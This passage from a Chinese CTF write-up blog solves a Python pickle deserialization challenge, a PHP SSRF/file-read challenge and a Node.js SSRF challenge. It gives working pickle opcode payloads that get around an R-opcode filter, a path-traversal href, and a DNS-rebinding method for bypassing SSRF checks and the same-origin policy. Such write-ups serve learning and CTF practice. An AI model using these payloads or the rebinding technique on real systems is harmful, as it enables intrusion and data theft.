app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">Animal</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> category<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name
        self<span class="token punctuation">.</span>category <span class="token operator">=</span> category

    <span class="token keyword">def</span> <span class="token function">__repr__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> f<span class="token string">'Animal(name={self.name!r}, category={self.category!r})'</span>

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> other<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> type<span class="token punctuation">(</span>other<span class="token punctuation">)</span> <span class="token keyword">is</span> Animal <span class="token operator">and</span> self<span class="token punctuation">.</span>name <span class="token operator">==</span> other<span class="token punctuation">.</span>name <span class="token operator">and</span> self<span class="token punctuation">.</span>category <span class="token operator">==</span> other<span class="token punctuation">.</span>category


<span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span>encoding<span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>
        <span class="token keyword">return</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'source'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Response<span class="token punctuation">(</span>read<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            pickle_data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> b<span class="token string">'R'</span> <span class="token keyword">in</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string">'No... I don\'t like R-things. No Rabits, Rats, Roosters or RCEs.'</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                result <span class="token operator">=</span> restricted_loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> type<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token keyword">is</span> <span class="token operator">not</span> Animal<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">'Are you sure that is an animal???'</span>
            correct <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">==</span> Animal<span class="token punctuation">(</span>secret<span class="token punctuation">.</span>name<span class="token punctuation">,</span> secret<span class="token punctuation">.</span>category<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_result.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">,</span> giveflag<span class="token operator">=</span>correct<span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token string">"Something wrong"</span>

    sample_obj <span class="token operator">=</span> Animal<span class="token punctuation">(</span><span class="token string">'一给我哩giaogiao'</span><span class="token punctuation">,</span> <span class="token string">'Giao'</span><span class="token punctuation">)</span>
    pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sample_obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'unpickle_page.html'</span><span class="token punctuation">,</span> sample_obj<span class="token operator">=</span>sample_obj<span class="token punctuation">,</span> pickle_data<span class="token operator">=</span>pickle_data<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>
</code></pre>
<p>函数不多，类定义的都是一些方便使用的魔法方法，强化了pickle反序列化的限制，重写find_class函数，只允许使用main里面的方法，然后也很明显的给了一个read函数，看一眼就知道是利用这个函数读文件读flag。<br>pickle反序列化时的命令执行都是调用find_class函数返回一个可执行对象，而find_class的本质其实是getattr(module, name)，这里重写了find_class把可调用的对象限制在了main中<br>而通常使用pickle执行命令使用的opcode R被过滤了，但是既然思路是这个样子，就肯定有别的方法去执行命令，然后就去看opcode，看opcode的详细说明，发现创建一个类实例的opcode同样是调用find_class方法实现的，也就意味着创建类实例的opcode同样可以执行命令。</p>
<p>接下来思路就很清晰了，首先调用read函数读取关键文件，但是若想获得内容还需要反序列化对象是一个Animal，然后在被渲染的html中带出，那么就是将read的返回值作为一个参数用来初始化Animal类，由于他会显示反序列化出来的类的内容，即可外带获取。<br>之后就是研究这个栈语言怎么写，如何把调用的返回值作为参数构造类如何。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>其中有两个坑，第一个是Windows和Linux下python的反序列化是有区别的，而我习惯在pycharm上干活，结果在pycharm上调通的payload打半天打不下去呜呜呜，浪费了一个多小时。<br>其次是源码执行过程中有一个异常处理，我一开始想直接猜flag位置直接读一波，结果每次都会出现一个异常，而本地是能跑通的，我和他的区别就是少了最后的那个渲染返回，后来估计是flag位置猜的不对，读不出数据来渲染就会触发异常<br>最后是看他直接import了secret，直接去读了secret.py，拿到了secret里面的name和category，然后按照他的要求构造一个打过去拿到flag的</p>
<p>记一下payload</p>
<pre><code>(c__main__
Animal
S&#39;i29skam3ls&#39;
(c__main__
read
S&#39;secret.py&#39;
oo.
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>查资料的时候看到的一个opcode解释和使用样例的连接<br><a href="https://xz.aliyun.com/t/7012">https://xz.aliyun.com/t/7012</a></p>
<h2 id="Null的wp"><a href="#Null的wp" class="headerlink" title="Null的wp"></a>Null的wp</h2><p>比赛结束之后看到了null的wp，他们的payload思路不同，直接重新引入一个secret模块进行覆盖，然后判断为真也可通过判断<br>payload：</p>
<pre class=" language-python"><code class="language-python">\x80\x03c__main__\nsecret\n<span class="token punctuation">}</span><span class="token punctuation">(</span>X\x04\x00\x00\x00nameX\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub0c__main__\nAnimal\n<span class="token punctuation">)</span>\x81<span class="token punctuation">}</span><span class="token punctuation">(</span>X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00233X\x08\x00\x00\x00categoryX\x03\x00\x00\x00233ub<span class="token punctuation">.</span>
</code></pre>
<p>这里首先用c获取一个导入main中的secret，然后用}压入一个空字典，(设置Mark，用X接连填入参数，u将Mark后的数据弹出添加到之前的空字典中，使用b修改实例的__dict__（存储当前实例的属性），至此完成了对secret属性的修改，然后用0将其pop出栈，开始构建animal实例，之后的部分再创建一个和覆盖过的属性相同的对象就可以通过检测了<br>构造时先引入animal，用)压入一个空元组，\x81表示用class的__new__方法通过元组创建实例，(放入一个Mark，X压入字符串，q表示一个1byte大小的参数，X压入参数，u将其作为键值对弹出，b更新字典，完成对animal的构建，.结束pickle</p>
<p>但是没懂这个\x00这些字符是怎么来的，不懂</p>
<p>所以自己按照这个思路重写了一个payload</p>
<pre class=" language-python"><code class="language-python">c__main__
secret
<span class="token punctuation">(</span>S<span class="token string">'name'</span>
S<span class="token string">'233'</span>
S<span class="token string">'category'</span>
S<span class="token string">'233'</span>
db0<span class="token punctuation">(</span>c__main__
Animal
S<span class="token string">'233'</span>
S<span class="token string">'233'</span>
o<span class="token punctuation">.</span>
</code></pre>
<p>感觉看得懂多了，毕竟用的opcode少了不少，我最后也没有看懂null的神仙那个X的opcode怎么用<br><del>对着上面那个链接的举例构造起来还挺容易的</del><br>R这个调用的opcodeban了之后用o i这两个代替还是挺好用的，没什么区别</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>反序列化</tag>
        <tag>python</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>[XCTF]华为第二场</title>
    <url>/%5BXCTF%5D%E5%8D%8E%E4%B8%BA%E7%AC%AC%E4%BA%8C%E5%9C%BA.html</url>
    <content><![CDATA[<h1 id="XCTF-华为第二场"><a href="#XCTF-华为第二场" class="headerlink" title="[XCTF]华为第二场"></a>[XCTF]华为第二场</h1><p>这个星期好像华为三连。。。今天这场选星期三刚好完全满课，下午就没机会看了，中午花了一个小时做了一个web签到呜呜，估计下午肯定还有一堆新题</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>给了一个莫名其妙的扫描扫描器界面，可选ip端口和超时时间，随便怎么输都是回显<code>Port scan is deperacted and try to find the source code! // Google is your best friend</code>让人不知道想表达什么，意思是要谷歌出源码？<br>我反正是没懂什么情况，然后无敌老国王直接从GitHub给我丢了一份源码<br><strong>直接把HTML复制粘贴在GitHub上一搜就能搜到对应的代码</strong><br>太牛逼了</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置程序执行时间</span>
<span class="token function">ob_implicit_flush</span><span class="token punctuation">(</span>True<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">/*端口扫描代码*/</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>这段就是被出题人魔改去掉的部分
<span class="token comment" spellcheck="true">/*内网代理代码*/</span>

<span class="token keyword">function</span> <span class="token function">getHtmlContext</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//表示需要response header</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_NOBODY</span><span class="token punctuation">,</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//表示需要response body</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_TIMEOUT</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">global</span> <span class="token variable">$header</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$headerSize</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HEADER_SIZE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">,</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$headerSize</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span> <span class="token variable">$headerSize</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'200'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$body</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'302'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token string">"Location"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//') == false){</span>
            <span class="token variable">$location</span> <span class="token operator">=</span> <span class="token function">getHost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$location</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">getHtmlContext</span><span class="token punctuation">(</span><span class="token variable">$location</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">NULL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">getHost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(http:\/\/)?([^\/]+)/i"</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">getCss</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token variable">$html</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;link[\s\S]*?href=['\"](.*?[.]css.*?)[\"'][\s\S]*?>/i"</span><span class="token punctuation">,</span><span class="token variable">$html</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$cssurl</span> <span class="token operator">=</span> <span class="token variable">$v</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span>'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//') == false){</span>
            <span class="token variable">$cssurl</span> <span class="token operator">=</span> <span class="token variable">$host</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$v</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$csshtml</span> <span class="token operator">=</span> <span class="token string">"&lt;style>"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$cssurl</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/style>"</span><span class="token punctuation">;</span>
        <span class="token variable">$html</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$csshtml</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$html</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$url</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>

    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">getHost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">getCss</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">,</span><span class="token function">getHtmlContext</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<p>getHtmlContext就是一个能追踪重定向的函数(但是实际使用的时候发现好像不是很能追踪。。。vps上设置了http跳转https，然后好像没追踪过去，我感觉是重定向要求是http那里出问题了)<br>getHost就获取域名，限制了http协议<br>getCss，不知道为什么扫描器要抓css。。。但是这是一个ssrf的点，preg_match_all会匹配子正则表达式，就是小括号里的正则表达式<br>matches[0]存整个正则表达式匹配到的项，matches[1]及往后的项保存子组的匹配<br>所以这里的matches[1]就是所以满足<code>(.*?[.]css.*?)</code>这么个正则表达式的匹配项<br>然后检测一下matches[1]里面有没有http:&#x2F;&#x2F; 这个字符串，没得就把前面拼一个host，最后直接进行一个file_get_contents<br>其实蛮简单的，绕过.css和http:&#x2F;&#x2F; 这两个限制就行了，经典Linux跳目录之术<br>在自己vps上放一个符合getCss正则的消息就行，href填如下消息即可<br><code>.css/http://../../../../../var/www/html/index.php</code><br>读根目录flag没读到，然后试了一波flag.php，读到flag</p>
<h2 id="云存储"><a href="#云存储" class="headerlink" title="云存储"></a>云存储</h2><p>晚上再来看题，一共就两个web，后面出的这个是nodejs的题<br>给了源码，有上传下载功能，感觉毫无用处，和ssrf功能，本地访问flag路由时返回flag<br>用的req.ip，理论上和PHP的remote_address应该是一个东西<br>ssrf功能就是给个链接就去访问，但是需要过一个超级check</p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> check <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">typeof</span> <span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'string'</span> <span class="token operator">||</span> <span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex">/^http\:\/\//</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span>

    <span class="token keyword">let</span> blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'wrong'</span><span class="token punctuation">,</span> <span class="token string">'127.'</span><span class="token punctuation">,</span> <span class="token string">'local'</span><span class="token punctuation">,</span> <span class="token string">'@'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span>
    <span class="token keyword">let</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> dns<span class="token punctuation">;</span>

    host <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    port <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>port
    <span class="token keyword">if</span> <span class="token punctuation">(</span> host <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> port <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span>

    dns <span class="token operator">=</span> <span class="token function">dnslookup</span><span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> ip<span class="token punctuation">.</span><span class="token function">isPrivate</span><span class="token punctuation">(</span>dns<span class="token punctuation">)</span> <span class="token operator">||</span> dns <span class="token operator">!=</span> docker<span class="token punctuation">.</span>ip <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token string">'80'</span><span class="token punctuation">,</span><span class="token string">'8080'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span>

    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> blacklist<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">let</span> regex <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RegExp</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>ip<span class="token punctuation">.</span><span class="token function">fromLong</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/[^\d]/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>regex<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span>
</code></pre>
<p>dnslookup函数就是去访问一个特定接口查询域名对应的ip，然后需要dns查询出的结果不是私有地址，且dns查询ip等于本机公网ip，端口不是80和8080<br>最后过一个正则，提交链接中不能有黑名单中的字符</p>
<h3 id="DNS-rebinding"><a href="#DNS-rebinding" class="headerlink" title="DNS rebinding"></a>DNS rebinding</h3><p>学到的新操作<br>DNS重定向，用于ssrf的waf绕过，也能bypass同源策略</p>
<h4 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h4><p>就本题中，进行DNS查询时，除了返回域名对应的ip，还会返回一个TTL，表明这条记录的有效时间，如果我们在check时域名对应的ip为符合要求的公网ip，而check结束后请求的ip却变回内网ip，就能进行绕过</p>
<p>我们令TTL&#x3D;0，查询结果就变成一次性的，即可在check时得到的DNS记录在真实发送时无效，再查一次结果获得的是127.0.0.1完成利用</p>
<h4 id="同源策略bypass"><a href="#同源策略bypass" class="headerlink" title="同源策略bypass"></a>同源策略bypass</h4><p>看bendawang师傅的博客<br><a href="http://bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/">关于DNS-rebinding的总结</a><br>思路就是钓鱼网站为<a href="http://www.xxx.com/">www.xxx.com</a> ，其中有一个对<a href="http://www.xxx.com/source">www.xxx.com/source</a> 的请求，再把这个请求转发出来。当用户访问<a href="http://www.xxx.com/">www.xxx.com</a> 时，查询DNS获取一个正常的公网地址，而将TTL设为很短的时间，然后整一个setTimeout，在一段时间后请求<a href="http://www.xxx.com/source">www.xxx.com/source</a> 的内容，但是此时DNS返回的<a href="http://www.xxx.com/">www.xxx.com</a> 的ip地址却是127.0.0.1，这样子就能将用户本地source下的内容转发出来<br>但是浏览器觉得这只是<a href="http://www.xxx.com/">www.xxx.com</a> 在操作自身域的资源，因此允许进行转发，并未违背同源策略，完成利用</p>
